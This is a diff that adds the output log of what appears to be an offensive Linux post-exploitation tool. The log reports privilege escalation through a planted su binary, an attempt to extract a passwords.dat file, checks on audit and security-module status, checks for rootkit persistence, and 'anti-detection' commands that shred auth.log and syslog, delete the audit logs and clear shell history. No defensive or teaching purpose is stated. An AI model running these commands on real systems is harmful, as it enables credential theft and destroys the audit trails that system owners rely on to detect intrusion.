@@ -1,0 +1,17 @@
+[+] chmod Status:
+Using su for stealth execution.
+==================================================
+[+] Passwords.dat Extraction Status:
+Failed to extract passwords.dat.
+==================================================
+[+] Stealth Verification Results:
+{"/mnt/data/su -c 'auditctl -l'": '', "/mnt/data/su -c 'aa-status'": '', "/mnt/data/su -c 'getenforce'": '', "/mnt/data/su -c 'ps aux | grep auditd'": '', "/mnt/data/su -c 'ls -lsa /var/log/auth.log /var/log/syslog /var/log/audit/'": ''}
+==================================================
+[+] Persistence Verification Results:
+{"/mnt/data/su -c 'lsmod | grep rootkit'": '', "/mnt/data/su -c 'cat /boot/grub/grub.cfg | grep Malicious'": '', "/mnt/data/su -c 'systemctl list-unit-files | grep evil'": ''}
+==================================================
+[+] Forensic Anti-Detection Measures Applied:
+{"/mnt/data/su -c 'shred -u /var/log/auth.log /var/log/syslog'": '', "/mnt/data/su -c 'rm -rf /var/log/audit/*'": '', "/mnt/data/su -c 'history -c && history -w'": ''}
+==================================================
+[+] Extracted Passwords.dat Content:
+
